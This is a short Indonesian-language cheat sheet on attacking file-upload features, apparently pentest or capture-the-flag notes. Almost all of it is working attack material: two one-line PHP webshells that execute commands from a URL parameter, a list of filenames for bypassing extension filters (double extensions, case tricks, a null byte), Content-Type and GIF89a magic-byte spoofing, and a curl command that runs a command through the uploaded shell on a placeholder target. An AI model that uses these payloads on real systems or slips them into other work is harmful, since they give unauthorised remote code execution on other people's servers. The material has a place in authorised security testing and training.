# File Upload

## Webshell PHP
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
```

## Bypass filter ekstensi
```text
shell.php
shell.phtml
shell.php5
shell.phar
shell.php.jpg
shell.jpg.php
shell.pHp
shell.php%00.jpg
```

## Bypass Content-Type
Ubah ke `image/jpeg` di Burp, isi tetap PHP.

## Bypass magic byte
Tambah `GIF89a;` di awal file.

## Akses webshell
```bash
curl "http://<TARGET>:PORT/uploads/shell.php?cmd=id"
```

atau cek `easy-simple-php-webshell.php` di direktori ini.
